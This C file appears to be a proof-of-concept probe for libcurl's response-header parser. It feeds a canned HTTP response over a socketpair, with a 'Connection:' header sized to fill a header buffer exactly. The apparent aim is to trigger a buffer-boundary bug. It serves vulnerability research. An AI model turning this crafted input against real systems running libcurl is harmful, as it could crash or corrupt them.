/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___ | | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ <| |___
 *                             \___|\___|_| \_\_____|
 *
 * PoC probe: drives libcurl's response-header parser through the public API
 * by handing over a socketpair as the connection socket and delivering a
 * canned server response on it.
 *
 * Build: see pocs/run.sh
 *
 * SPDX-License-Identifier: curl
 ***************************************************************************/
#include <curl/curl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

static curl_socket_t conn_sock = CURL_SOCKET_BAD;

static curl_socket_t opensocket_cb(void *clientp, curlsocktype purpose,
                                   struct curl_sockaddr *address)
{
  (void)clientp;
  (void)purpose;
  (void)address;
  return conn_sock;
}

static int closesocket_cb(void *clientp, curl_socket_t item)
{
  (void)clientp;
  (void)item;
  return 0;
}

static int sockopt_cb(void *clientp, curl_socket_t item, curlsocktype purpose)
{
  (void)clientp;
  (void)item;
  (void)purpose;
  return CURL_SOCKOPT_ALREADY_CONNECTED;
}

int main(void)
{
  int sv[2];
  /* status line first: 17 bytes, so the header buffer starts with a
   * 32 byte allocation; the crafted header line below then fits exactly:
   * "Connection: a" + 15 commas + CRLF = 30 bytes + NUL */
  static const char resp[] =
    "HTTP/1.1 200 OK\r\n"
    "Connection: a,,,,,,,,,,,,,,\r\n"
    "Content-Length: 0\r\n"
    "\r\n";

  if(socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0)
    return 1;

  /* the "server" sends its response up front */
  if(write(sv[1], resp, sizeof(resp) - 1) == -1)
    return 1;

  conn_sock = (curl_socket_t)sv[0];

  {
    CURLcode rc;
    CURL *h = curl_easy_init();
    if(!h)
      return 1;
    curl_easy_setopt(h, CURLOPT_URL, "http://localhost/1");
    curl_easy_setopt(h, CURLOPT_OPENSOCKETFUNCTION, opensocket_cb);
    curl_easy_setopt(h, CURLOPT_SOCKOPTFUNCTION, sockopt_cb);
    curl_easy_setopt(h, CURLOPT_CLOSESOCKETFUNCTION, closesocket_cb);
    curl_easy_setopt(h, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(h, CURLOPT_TIMEOUT, 10L);
    rc = curl_easy_perform(h);
    printf("perform rc = %d (%s)\n", (int)rc, curl_easy_strerror(rc));
    curl_easy_cleanup(h);
  }

  close(sv[0]);
  close(sv[1]);
  return 0;
}
